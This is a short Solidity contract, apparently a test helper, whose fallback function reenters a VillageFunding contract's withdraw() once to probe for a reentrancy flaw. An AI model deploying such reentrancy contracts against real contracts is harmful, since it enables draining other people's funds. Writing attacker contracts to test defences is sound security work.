// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "../interfaces/IVillageFunding.sol";

contract ReentrancyAttacker {
    
    bool hasReentered;

    fallback() external payable {
        if (hasReentered) { return; }

        hasReentered = true;
        IVillageFunding(msg.sender).withdraw();

    }

}